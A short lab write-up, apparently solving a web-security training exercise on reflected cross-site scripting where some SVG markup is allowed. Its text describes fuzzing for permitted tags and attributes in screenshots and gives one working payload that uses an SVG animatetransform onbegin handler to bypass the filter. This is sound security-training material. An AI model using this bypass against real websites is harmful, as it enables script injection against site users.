# Reflected XSS with some SVG markup allowed

Fuzz for allowed tags

![Снимок экрана 2025-11-14 в 16.06.41.png](Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-14_%D0%B2_16.06.41.png)

![Снимок экрана 2025-11-14 в 16.08.03.png](Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-14_%D0%B2_16.08.03.png)

![Снимок экрана 2025-11-14 в 16.06.52.png](Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-14_%D0%B2_16.06.52.png)

Fuzz for allowed attributes

![Снимок экрана 2025-11-14 в 16.08.19.png](Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-14_%D0%B2_16.08.19.png)

![Снимок экрана 2025-11-14 в 16.09.20.png](Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-14_%D0%B2_16.09.20.png)

With svg, animatetransform and onbegin, construct a payload:

```jsx
"><svg><animatetransform onbegin=alert(1)>
```

![Снимок экрана 2025-11-14 в 16.11.00.png](Reflected%20XSS%20with%20some%20SVG%20markup%20allowed/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-11-14_%D0%B2_16.11.00.png)